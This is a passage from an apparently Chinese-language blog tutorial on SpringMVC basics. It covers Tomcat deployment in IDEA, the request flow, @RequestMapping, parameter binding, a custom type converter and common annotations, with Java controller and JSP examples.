&lt;mvc:annotation-driven/&gt;&lt;/beans&gt;</code></pre><p><strong>4、 编写index.jsp和HelloController控制器类</strong>：</p><p> index.jsp：</p><pre><code class="html">&lt;body&gt;&lt;h3&gt;入门案例&lt;/h3&gt;&lt;a href=&quot;hello&quot;&gt;入门案例&lt;/a&gt;&lt;/body&gt;</code></pre><p>HelloController:</p><pre><code class="java">@Controllerpublic class HelloController &#123;    @RequestMapping(&quot;/hello&quot;)    public String sayHello() &#123;        System.out.println(&quot;Hello SpringMVC&quot;);        return &quot;success&quot;;    &#125;&#125;</code></pre><p><strong>5、 在WEB-INF目录下创建pages文件夹，编写success.jsp的成功页面</strong>；</p><pre><code class="html">&lt;body&gt;&lt;h3&gt;入门成功！！&lt;/h3&gt;&lt;/body&gt;</code></pre><p><strong>6、 启动Tomcat服务器，进行测试</strong>：</p><p>因为之前一直用的Eclipse，所以这里细说一下IDEA下添加tomcat并发布项目的过程。</p><p>1、首先点击箭头所指处添加服务器：</p><p><img src="http://img-blog.csdnimg.cn/20201020194826260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>2、点左上角的加号，找到并选择Tomcat Server下的 Local</p><p><img src="http://img-blog.csdnimg.cn/20201020194958529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>3、在Deployment下点 “+” 号，选择第一个添加项目：</p><p><img src="http://img-blog.csdnimg.cn/20201020195519996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> 选择第一个</p><p><img src="http://img-blog.csdnimg.cn/20201020195715374.png#pic_center" alt="在这里插入图片描述"><br>箭头处为项目的访问路径，完整路径要加上 localhost:8080 </p><p><img src="http://img-blog.csdnimg.cn/20201020200622280.png#pic_center" alt="在这里插入图片描述"></p><blockquote><p>注：一定要点 Apply，不然无法完成添加。</p></blockquote><p>4、添加完成后会出现Application Server 。</p><p><img src="http://img-blog.csdnimg.cn/20201020200935698.png#pic_center" alt="在这里插入图片描述"><br>5、右键运行，IDEA会自动跳转到游览器打开：</p><p><img src="http://img-blog.csdnimg.cn/20201020201211792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20201020201229597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>测试成功！（￣︶￣）↗　<br><br></p><h4 id="三、入门案例的执行过程分析："><a href="#三、入门案例的执行过程分析：" class="headerlink" title="三、入门案例的执行过程分析："></a>三、入门案例的执行过程分析：</h4><p> <strong>1、入门案例的执行流程</strong>：</p><ol><li>当启动Tomcat服务器的时候，因为配置了load-on-startup标签，所以会创建DispatcherServlet对象，就会加载springmvc.xml配置文件。</li><li>开启了注解扫描，那么HelloController对象就会被创建。</li><li>从index.jsp发送请求，请求会先到达DispatcherServlet核心控制器，根据配置@RequestMapping注解找到执行的具体方法。</li><li>根据执行方法的返回值，再根据配置的视图解析器，去指定的目录下查找指定名称的JSP文件。</li><li>Tomcat服务器渲染页面，做出响应。</li></ol><p>图解：</p><p><img src="http://img-blog.csdnimg.cn/20201020205708148.png#pic_center" alt="在这里插入图片描述"><br> <strong>2、入门案例中的组件分析</strong>：</p><p>1、前端控制器（DispatcherServlet）</p><ul><li> 用户请求到达前端控制器，它就相当于 mvc 模式中的 c，dispatcherServlet 是整个流程控制的中心，由它调用其它组件处理用户的请求，dispatcherServlet 的存在降低了组件之间的耦合性。</li></ul><p>2、处理器映射器（HandlerMapping）</p><ul><li>HandlerMapping 负责根据用户请求找到 Handler 即处理器，SpringMVC 提供了不同的映射器实现不同的映射方式，例如：配置文件方式，实现接口方式，注解方式等。</li></ul><p>3、处理器适配器（HandlAdapter）</p><ul><li>通过 HandlerAdapter 对处理器进行执行，这是适配器模式的应用，通过扩展适配器可以对更多类型的处理器进行执行。</li></ul><p>4、处理器（Handler）</p><ul><li>它就是我们开发中要编写的具体业务控制器。由 DispatcherServlet 把用户请求转发到 Handler。由Handler 对具体的用户请求进行处理。</li></ul><p>5、视图解析器（View Resolver）</p><ul><li>View Resolver 负责将处理结果生成 View 视图，View Resolver 首先根据逻辑视图名解析成物理视图名即具体的页面地址，再生成 View 视图对象，最后对 View 进行渲染将处理结果通过页面展示给用户。</li></ul><p>6、视图（View）</p><ul><li><p>SpringMVC 框架提供了很多的 View 视图类型的支持，包括：jstlView、freemarkerView、pdfView等。我们最常用的视图就是 jsp。</p></li><li><p>一般情况下需要通过页面标签或页面模版技术将模型数据通过页面展示给用户，需要由程序员根据业务需求开发具体的页面。</p></li></ul><p> <strong>3、<code>&lt;mvc:annotation-driven/&gt;</code>说明</strong>：</p><ul><li>在 SpringMVC 的各个组件中，处理器映射器、处理器适配器、视图解析器称为 SpringMVC 的三大组件。</li><li>使 用 <code>&lt;mvc:annotation-driven&gt;</code> 自动加载 RequestMappingHandlerMapping（处理映射器）和RequestMappingHandlerAdapter（处理适配器），可用在SpringMVC.xml 配置文件中使用<code>&lt;mvc:annotation-driven/&gt;</code>替代注解处理器和适配器的配置。</li><li>一般开发中，我们都需要写上此标签（虽然从入门案例中看，我们不写也行，随着课程的深入，该标签还有具体的使用场景）。</li></ul><h4 id="四、RequestMapping-注解："><a href="#四、RequestMapping-注解：" class="headerlink" title="四、RequestMapping 注解："></a>四、RequestMapping 注解：</h4><h5 id="1、使用说明："><a href="#1、使用说明：" class="headerlink" title="1、使用说明："></a>1、使用说明：</h5><p><strong>作用</strong>：</p><ul><li>用于建立请求 URL 和处理请求方法之间的对应关系。</li></ul><p><strong>出现位置</strong>：</p><p>类上：</p><ul><li>请求 URL 的第一级访问目录。此处不写的话，就相当于应用的根目录。写的话需要以<code>/</code>开头。</li></ul><p>它出现的目的是为了使我们的 URL 可以按照模块化管理：</p><p>例如：</p><ul><li><p>账户模块：<br>/account/add<br>/account/update<br>/account/delete</p></li><li><p>订单模块：<br>/order/add<br>/order/update<br>/order/delete</p></li></ul><p>/accound，/order 就是把 RequsetMappding 写在类上，使我们的 URL 更加精细。</p><p>方法上：</p><ul><li>请求 URL 的第二级访问目录。</li></ul><p><strong>属性</strong>：</p><p>value：用于指定请求的 URL。它和 path 属性的作用是一样的。</p><p>method：用于指定请求的方式。</p><p>params：用于指定限制请求参数的条件。它支持简单的表达式。要求请求参数的 key 和 value 必须和配置的一模一样。</p><ul><li>例如：<br>params = {“accountName”}，表示请求参数必须有 accountName<br>params = {“moeny!100”}，表示请求参数中 money 不能是 100。</li></ul><p>headers：用于指定限制请求消息头的条件。</p><blockquote><p>注意：以上四个属性只要出现 2 个或以上时，他们的关系是与的关系。</p></blockquote><h5 id="2、使用示例："><a href="#2、使用示例：" class="headerlink" title="2、使用示例："></a>2、使用示例：</h5><p><strong>1、出现位置的示例</strong>：</p><p>控制器代码：</p><pre><code class="java">@Controller(&quot;accountController&quot;)@RequestMapping(&quot;/account&quot;)public class AccountController &#123;    @RequestMapping(&quot;/findAccount&quot;)    public String findAccount() &#123;        System.out.println(&quot;查询了账户。。。。&quot;);        return &quot;success&quot;;    &#125;&#125;</code></pre><p>jsp代码：</p><pre><code class="html">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;    &lt;title&gt;requestmapping 的使用&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- 第一种访问方式 --&gt;&lt;a href=&quot;$&#123;pageContext.request.contextPath&#125;/account/findAccount&quot;&gt;    查询账户&lt;/a&gt;&lt;br/&gt;&lt;!-- 第二种访问方式 --&gt;&lt;a href=&quot;account/findAccount&quot;&gt;查询账户&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><blockquote><p>注意：当使用此种方式配置时，在 jsp 中第二种写法时，不要在访问 URL 前面加<code>/</code>，否则无法找到资源。</p></blockquote><p><strong>2、method 属性的示例</strong>：</p><p>控制器代码：</p><pre><code class="java">@RequestMapping(value=&quot;/saveAccount&quot;,method=RequestMethod.POST)public String saveAccount() &#123;    System.out.println(&quot;保存了账户&quot;);    return &quot;success&quot;;&#125;</code></pre><p>jsp 代码：</p><pre><code class="html">&lt;!-- 请求方式的示例 --&gt;&lt;a href=&quot;account/saveAccount&quot;&gt;保存账户，get 请求&lt;/a&gt;&lt;br/&gt;&lt;form action=&quot;account/saveAccount&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;保存账户，post 请求&quot;&gt;&lt;/form&gt;</code></pre><p>当使用 get 请求时，提示错误信息是 405，信息是方法不支持 get 方式请求</p><p><img src="http://img-blog.csdnimg.cn/20201020230819527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>3、params 属性的示例</strong>：</p><p>控制器的代码：</p><pre><code class="java">@RequestMapping(value=&quot;/removeAccount&quot;,params= &#123;&quot;accountName&quot;,&quot;money&gt;100&quot;&#125;)    public String removeAccount() &#123;    System.out.println(&quot;删除了账户&quot;);    return &quot;success&quot;;    &#125;</code></pre><p>jsp 中的代码：</p><pre><code class="java">&lt;!-- 请求参数的示例 --&gt;&lt;a href=&quot;account/removeAccount?accountName=aaa&amp;money&gt;100&quot;&gt;删除账户，金额 100&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;account/removeAccount?accountName=aaa&amp;money&gt;150&quot;&gt;删除账户，金额 150&lt;/a&gt;</code></pre><p>当点击第一个超链接时,可以访问成功。<br>当点击第二个超链接时，无法访问。如下图：</p><p><img src="http://img-blog.csdnimg.cn/20201020232649491.png#pic_center" alt="在这里插入图片描述"><br><br><br></p><h4 id="五、请求参数的绑定："><a href="#五、请求参数的绑定：" class="headerlink" title="五、请求参数的绑定："></a>五、请求参数的绑定：</h4><h5 id="1、什么是参数绑定？"><a href="#1、什么是参数绑定？" class="headerlink" title="1、什么是参数绑定？"></a>1、什么是参数绑定？</h5><ul><li>就是将请求参数串中的value值获取到之后，在进行类型转换，然后将转换后的值赋值给Controller类中方法的形参，这个过程就是参数绑定。</li></ul><h5 id="2、-绑定说明："><a href="#2、-绑定说明：" class="headerlink" title="2、 绑定说明："></a>2、 绑定说明：</h5><p><strong>2.1、绑定的机制</strong>：</p><p> 我们都知道，表单中请求参数都是基于 key=value 的。<br> SpringMVC 绑定请求参数的过程是通过把表单提交请求参数，作为控制器中方法参数进行绑定的。</p><p>例：</p><p>jsp 代码：</p><pre><code class="html">&lt;a href=&quot;account/findAccount?accountId=10&quot;&gt;查询账户&lt;/a&gt;</code></pre><p>jsp中请求参数是：accountId=10</p><pre><code class="java">@RequestMapping(&quot;/findAccount&quot;)public String findAccount(Integer accountId) &#123;    System.out.println(&quot;查询了账户。。。。&quot;+accountId);    return &quot;success&quot;;&#125;</code></pre><p>点击链接，会在控制台输出：<br><img src="http://img-blog.csdnimg.cn/20201021205427741.png" alt="在这里插入图片描述"><br><strong>2.2、支持的数据类型：</strong></p><ol><li>基本数据类型和 String 类型</li><li>POJO 类型参数：包括实体类，以及关联的实体类</li><li>集合类型和数组：包括 List 结构和 Map 结构的集合（包括数组）</li></ol><h5 id="3、使用示例："><a href="#3、使用示例：" class="headerlink" title="3、使用示例："></a>3、使用示例：</h5><p><strong>3.1、基本类型和 String 类型作为参数</strong>：</p><p>jsp 代码：</p><pre><code class="html">&lt;!-- 基本类型示例 --&gt;&lt;a href=&quot;account/findAccount?accountId=10&amp;accountName=zhangsan&quot;&gt;查询账户&lt;/a&gt;</code></pre><p>控制器代码：</p><pre><code class="java">@RequestMapping(&quot;/findAccount&quot;)public String findAccount(Integer accountId,String accountName) &#123;    System.out.println(&quot;查询了账户。。。。&quot;+accountId+&quot;,&quot;+accountName);    return &quot;success&quot;;&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201021211630152.png#pic_center" alt="在这里插入图片描述"><br><strong>3.2、POJO 类型作为参数</strong>：</p><p>实体类代码：</p><pre><code class="java">/*** 账户信息*/public class Account implements Serializable&#123;    private Integer id;    private String name;    private Float money;    private Address address;    //省略getters and setters 和 tostring方法&#125;</code></pre><pre><code class="java">/*** 地址的实体类*/public class Address implements Serializable &#123;    private String provinceName;    private String cityName;    //省略getters and setters 和 tostring方法    &#125;</code></pre><p>jsp 代码：</p><pre><code class="html">&lt;form action=&quot;account/saveAccount&quot; method=&quot;post&quot;&gt;账户名称：&lt;input type=&quot;text&quot; name=&quot;name&quot; &gt;&lt;br/&gt;账户金额：&lt;input type=&quot;text&quot; name=&quot;money&quot; &gt;&lt;br/&gt;账户省份：&lt;input type=&quot;text&quot; name=&quot;address.provinceName&quot; &gt;&lt;br/&gt;账户城市：&lt;input type=&quot;text&quot; name=&quot;address.cityName&quot; &gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;保存&quot;&gt;&lt;/form&gt;</code></pre><p>控制器代码：</p><pre><code class="java">@RequestMapping(&quot;/saveAccount&quot;)public String saveAccount(Account account) &#123;    System.out.println(&quot;保存了账户。。。。&quot;+account);    return &quot;success&quot;;&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/2020102122403412.png#pic_center" alt="在这里插入图片描述"><br><strong>3.3、 POJO 类中包含集合类型参数</strong>：</p><p>实体类代码：</p><pre><code class="java">public class User implements Serializable &#123;    private String username;    private String password;    private Integer age;    private List&lt;Account&gt; accounts;    private Map&lt;String, Account&gt; accountMap;    //省略getters and setters 和 tostring方法    </code></pre><p>jsp代码：</p><pre><code class="html">&lt;form action=&quot;account/updateAccount&quot; method=&quot;post&quot;&gt;    用户名称：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br/&gt;    用户密码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br/&gt;    用户年龄：&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;&lt;br/&gt;    账户 1 名称：&lt;input type=&quot;text&quot; name=&quot;accounts[0].name&quot;&gt;&lt;br/&gt;    账户 1 金额：&lt;input type=&quot;text&quot; name=&quot;accounts[0].money&quot;&gt;&lt;br/&gt;    账户 2 名称：&lt;input type=&quot;text&quot; name=&quot;accounts[1].name&quot;&gt;&lt;br/&gt;    账户 2 金额：&lt;input type=&quot;text&quot; name=&quot;accounts[1].money&quot;&gt;&lt;br/&gt;    账户 3 名称：&lt;input type=&quot;text&quot; name=&quot;accountMap[&#39;one&#39;].name&quot;&gt;&lt;br/&gt;    账户 3 金额：&lt;input type=&quot;text&quot; name=&quot;accountMap[&#39;one&#39;].money&quot;&gt;&lt;br/&gt;    账户 4 名称：&lt;input type=&quot;text&quot; name=&quot;accountMap[&#39;two&#39;].name&quot;&gt;&lt;br/&gt;    账户 4 金额：&lt;input type=&quot;text&quot; name=&quot;accountMap[&#39;two&#39;].money&quot;&gt;&lt;br/&gt;    &lt;input type=&quot;submit&quot; value=&quot;保存&quot;&gt;&lt;/form&gt;</code></pre><p>控制器代码：</p><pre><code class="java">@RequestMapping(&quot;/updateAccount&quot;)public String updateAccount(User user) &#123;    System.out.println(&quot;更新了账户。。。。&quot;+user);    return &quot;success&quot;;&#125;</code></pre><p>运行结果：<br><img src="http://img-blog.csdnimg.cn/20201021230255947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20201021232104373.png#pic_center" alt="在这里插入图片描述"><br><strong>3.4、请求参数乱码问题</strong>：</p><p>在web请求中当出现中文时会有乱码。get请求是不会乱码的</p><p>当是post 请求方式时，可以在 web.xml 中配置一个过滤器。</p><p>例：</p><pre><code class="xml">    &lt;!-- 配置过滤器，解决中文乱码的问题 --&gt;    &lt;filter&gt;        &lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;        &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;        &lt;!-- 指定字符集 --&gt;        &lt;init-param&gt;            &lt;param-name&gt;encoding&lt;/param-name&gt;            &lt;param-value&gt;UTF-8&lt;/param-value&gt;        &lt;/init-param&gt;    &lt;/filter&gt;    &lt;!-- 过滤所有请求 --&gt;     &lt;filter-mapping&gt;        &lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;    &lt;/filter-mapping&gt;</code></pre><h5 id="4、自定义类型转换器："><a href="#4、自定义类型转换器：" class="headerlink" title="4、自定义类型转换器："></a>4、自定义类型转换器：</h5><p> jsp表单提交的任何数据类型全部都是字符串类型，但是后台定义Integer类型，数据也可以封装上，说明Spring框架内部会默认进行数据类型转换。</p><p>但当我们把控制器中方法参数的类型改为 Date 时：</p><ul><li>jsp 代码：<pre><code class="html">&lt;a href=&quot;account/deleteAccount?date=2018-01-01&quot;&gt;根据日期删除账户&lt;/a&gt;</code></pre></li><li>控制器代码：<pre><code class="java">@RequestMapping(&quot;/deleteAccount&quot;)public String deleteAccount(Date date) &#123;  System.out.println(&quot;删除了账户。。。。&quot;+date);  return &quot;success&quot;;&#125;</code></pre>运行结果：</li></ul><p><img src="http://img-blog.csdnimg.cn/20201022122822362.png#pic_center" alt="在这里插入图片描述"></p><p>会出现类型转化异常。</p><p><strong>解决办法</strong>：自定义类型转换器</p><p> <strong>使用步骤</strong>：</p><p> 1、定义一个类，实现 Converter 接口，该接口有两个泛型。</p><pre><code class="java">public class StringToDateConverter implements Converter&lt;String, Date&gt; &#123;    @Override    public Date convert(String source) &#123;        DateFormat format = null;        try &#123;            if (source == null) &#123;                throw new NullPointerException(&quot;请输入要转换的日期&quot;);            &#125;            format = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;);            Date date = format.parse(source);            return date;        &#125; catch (Exception e) &#123;            throw new RuntimeException(&quot;输入日期有误&quot;);        &#125;    &#125;&#125;</code></pre><p> 2、第二步：在 spring 配置文件中配置类型转换器。</p><pre><code class="xml">  &lt;!-- 配置类型转换器工厂 --&gt;    &lt;bean id=&quot;converterService&quot; class=&quot;org.springframework.context.support.ConversionServiceFactoryBean&quot;&gt;        &lt;!-- 给工厂注入一个新的类型转换器 --&gt;        &lt;property name=&quot;converters&quot;&gt;            &lt;array&gt;                &lt;!-- 配置自定义类型转换器 --&gt;                &lt;bean class=&quot;com.smk.util.StringToDateConverter&quot;/&gt;            &lt;/array&gt;        &lt;/property&gt;    &lt;/bean&gt;</code></pre><p> 3、第三步：在 annotation-driven 标签中引用配置的类型转换服务 。</p><pre><code class="xml">&lt;!-- 引用自定义类型转换器 --&gt;&lt;mvc:annotation-driven conversion-service=&quot;converterService&quot;/&gt;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201022155614624.png" alt="在这里插入图片描述"></p><h5 id="5、在控制器中使用原生的ServletAPI对象"><a href="#5、在控制器中使用原生的ServletAPI对象" class="headerlink" title="5、在控制器中使用原生的ServletAPI对象"></a>5、在控制器中使用原生的ServletAPI对象</h5><p>SpringMVC 还支持使用原始 ServletAPI 对象作为控制器方法的参数。支持原始 ServletAPI 对象有：</p><ul><li>httpervletRequest、httpervlet、Responsehttpession  等…</li></ul><p><strong>使用方法</strong>：</p><p> 只需要在控制器的方法参数定义httpervletRequest和httpervletResponse对象</p><p>例：</p><pre><code class="java">@RequestMapping(&quot;/testServletAPI&quot;)public String testServletAPI(httpervletRequest request,httpervletResponse response,httpession session) &#123;    System.out.println(request);    System.out.println(response);    System.out.println(session);    return &quot;success&quot;;&#125;</code></pre><h4 id="六、常用注解："><a href="#六、常用注解：" class="headerlink" title="六、常用注解："></a>六、常用注解：</h4><p><strong>1、RequestParam注解</strong>：</p><p>作用：把请求中指定名称的参数给控制器中的形参赋值。</p><p> 属性：</p><ol><li>value：请求参数中的名称</li><li>required：请求参数中是否必须提供此参数，默认值是true，表示必须提供，如果不提供将报错。</li></ol><p>例：</p><p>jsp 中的代码：</p><pre><code class="html">&lt;!-- requestParams 注解的使用 --&gt;&lt;a href=&quot;springmvc/useRequestParam?name=test&quot;&gt;requestParam 注解&lt;/a&gt;</code></pre><p>控制器中的代码：</p><pre><code class="java">@RequestMapping(&quot;/useRequestParam&quot;)public String useRequestParam(@RequestParam(&quot;name&quot;)String username,@RequestParam(value=&quot;age&quot;,required=false)Integer age)&#123;    System.out.println(username+&quot;,&quot;+age);    return &quot;success&quot;;&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201022170608201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>2、RequestBody注解</strong>：</p><p>作用：</p><ul><li>用于获取请求体内容。直接使用得到是 key=value&amp;key=value…结构的数据。</li><li>get 请求方式不适用。（因为get没有请求体）</li></ul><p>属性：</p><ul><li> required：是否必须有请求体，默认值是true。当取值为 true 时，get 请求方式会报错。如果取值为 false，get 请求得到是 null。</li></ul><p>例：</p><p>post 请求 jsp 代码：</p><pre><code class="html">&lt;form action=&quot;useRequestBody&quot; method=&quot;post&quot;&gt;用户名称：&lt;input type=&quot;text&quot; name=&quot;username&quot; &gt;&lt;br/&gt;用户密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; &gt;&lt;br/&gt;用户年龄：&lt;input type=&quot;text&quot; name=&quot;age&quot; &gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;保存&quot;&gt;&lt;/form&gt;</code></pre><p>get 请求 jsp 代码：</p><pre><code class="java">&lt;a href=&quot;springmvc/useRequestBody?body=test&quot;&gt;requestBody 注解 get 请求&lt;/a&gt;</code></pre><p>控制器代码：</p><pre><code class="java">@RequestMapping(&quot;/useRequestBody&quot;)public String useRequestBody(@RequestBody(required=false) String body)&#123;    System.out.println(body);    return &quot;success&quot;;&#125;</code></pre><p>post 请求运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201022172247343.png#pic_center" alt="在这里插入图片描述"></p><p>get 请求运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201022172527919.png#pic_center" alt="在这里插入图片描述"><br><strong>3、PathVariable注解</strong>：</p><p>作用：</p><ul><li>用于绑定 url 中的占位符赋值给形参。例如：请求 url 中 /delete/{id}，这个 {id} 就是 url 占位符。</li><li>url 支持占位符是 spring3.0 之后加入的。是 springmvc 支持 rest 风格 URL 的一个重要标志。</li></ul><p>属性：</p><ul><li>value：用于指定 url 中占位符名称。</li><li>required：是否必须提供占位符。</li></ul><p>使用示例：</p><p>jsp 代码：</p><pre><code class="html">&lt;a href=&quot;usePathVariable/100&quot;&gt;pathVariable 注解&lt;/a&gt;</code></pre><p>控制器代码：</p><pre><code class="java">@RequestMapping(&quot;/usePathVariable/&#123;id&#125;&quot;)public String usePathVariable(@PathVariable(&quot;id&quot;) Integer id)&#123;    System.out.println(id);    return &quot;success&quot;;&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201022231013530.png#pic_center" alt="在这里插入图片描述"></p><p> <strong>Restful风格的URL</strong>：</p><ul><li> 请求路径一样，可以根据不同的请求方式去执行后台的不同方法。</li></ul><p><img src="http://img-blog.csdnimg.cn/20201022231923563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p> restful风格的URL优点：</p><ol><li>结构清晰</li><li>符合标准</li><li>易于理解</li><li>扩展方便</li></ol><p><strong>4、RequestHeader注解</strong>：</p><p>作用：</p><ul><li>用于获取请求消息头。</li></ul><p>属性：</p><ul><li>value：提供消息头名称</li><li>required：是否必须有此消息头</li></ul><blockquote><p>注：在实际开发中一般不怎么用。</p></blockquote><p>jsp 中代码：</p><pre><code class="java">&lt;a href=&quot;useRequestHeader&quot;&gt;获取请求消息头&lt;/a&gt;</code></pre><p>控制器中代码：</p><pre><code class="java">@RequestMapping(&quot;/useRequestHeader&quot;)    public String useRequestHeader(@RequestHeader(value = &quot;Accept-Language&quot;,            required = false) String requestHeader) &#123;        System.out.println(requestHeader);        return &quot;success&quot;;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/2020102312430834.png#pic_center" alt="在这里插入图片描述"></p><p><strong>6、ModelAttribute注解</strong>：</p><p>作用：</p><ol><li>出现在方法上：表示当前方法会在控制器方法执行前线执行。</li><li>出现在参数上：获取指定的数据给参数赋值。</li></ol><p>属性：</p><ul><li>value：用于获取数据的 key。key 可以是 POJO 的属性名称，也可以是 map 结构的 key。</li></ul><p>应用场景：</p><ul><li>当提交表单数据不是完整的实体数据时，保证没有提交的字段使用数据库原来的数据。</li></ul><p><strong>示例</strong>：</p><p>jps 代码：</p><pre><code class="html">&lt;a href=&quot;testModelAttribute?username=test&quot;&gt;测试 modelattribute&lt;/a&gt;</code></pre><p>控制器代码：</p><pre><code class="java">//接收请求的方法@RequestMapping(&quot;/testModelAttribute&quot;)public String testModelAttribute(User user) &#123;    System.out.println(&quot;执行了控制器的方法&quot;+user.getUsername());    return &quot;success&quot;;&#125;//被 ModelAttribute 修饰的方法@ModelAttributepublic void showModel(User user) &#123;    System.out.println(&quot;执行了 showModel 方法&quot;+user.getUsername());&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201024235031971.png#pic_center" alt="在这里插入图片描述"><br>ModelAttribute 修饰方法带返回值：</p><p>jsp 的代码：</p><pre><code class="html">&lt;!-- 修改用户信息 --&gt;&lt;form action=&quot;updateUser&quot; method=&quot;post&quot;&gt;用户名称：&lt;input type=&quot;text&quot; name=&quot;username&quot; &gt;&lt;br/&gt;用户年龄：&lt;input type=&quot;text&quot; name=&quot;age&quot; &gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;保存&quot;&gt;&lt;/form&gt;</code></pre><p>控制器中的代码：</p><pre><code class="java">    @RequestMapping(&quot;/testModelAttribute2&quot;)    //获取 ModelAttribute修饰的方法中的 User对象      public String testModelAttribute2(User user) &#123;          System.out.println(user);          return &quot;success&quot;;      &#125;    @ModelAttribute    private User showUser(String username) &#123;        //模拟数据库查询，把查询到的数据传入 user 中        User user = new User();        user.setUsername(username);        user.setAge(19);        user.setBirthday(new Date());        return user;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201025001705418.png#pic_center" alt="在这里插入图片描述"><br>先执行ModelAttribute修饰的方法，然后在把jsp中的数据覆盖user 的值，所以这里的 年龄和设置的不一样。</p><p>ModelAttribute 修饰方法不带返回值：</p><p>jsp 的代码：同上</p><p>控制器中的代码：</p><pre><code class="java"> @RequestMapping(&quot;/testModelAttribute2&quot;)     //把 ModelAttribute修饰的方法里的 map里 key的值赋给 user    public String testModelAttribute2(@ModelAttribute(&quot;abc&quot;) User user) &#123;        System.out.println(user);        return &quot;success&quot;;    &#125; @ModelAttribute  private void showUser(String username, Map&lt;String, User&gt; map) &#123;      //模拟数据库查询，把查询到的数据传入 user 中      User user = new User();      user.setUsername(username);      user.setAge(19);      user.setBirthday(new Date());      map.put(&quot;abc&quot;, user);  &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201025002833615.png#pic_center" alt="在这里插入图片描述"></p><p><strong>7、SessionAttribute</strong>：</p><p>作用：</p><ul><li>用于多次执行控制器方法间的参数共享。</li></ul><p>属性：</p><ul><li>value：用于指定存入的属性名称</li><li>type：用于指定存入的数据类型</li></ul><p><strong>使用示例</strong>：</p><p>jsp 中的代码：</p><pre><code class="java">&lt;a href=&quot;testPut&quot;&gt;存入 SessionAttribute&lt;/a&gt;&lt;hr/&gt;&lt;a href=&quot;testGet&quot;&gt;取出 SessionAttribute&lt;/a&gt;&lt;hr/&gt;&lt;a href=&quot;testDel&quot;&gt;清除 SessionAttribute&lt;/a&gt;</code></pre><p>控制器中的代码：</p><pre><code class="java">@Controller@SessionAttributes(value = &#123;&quot;msg&quot;&#125;)//把 msg = 张三 存入到session域中public class HelloController &#123;       @RequestMapping(&quot;/testPut&quot;)    public String testPut(Model model) &#123;        System.out.println(&quot; testPut...&quot;);        //底层会存储到request域对象中        model.addAttribute(&quot;msg&quot;, &quot;张三&quot;);        return &quot;success&quot;;    &#125;    @RequestMapping(&quot;/testGet&quot;)    public String testGet(ModelMap model) &#123;        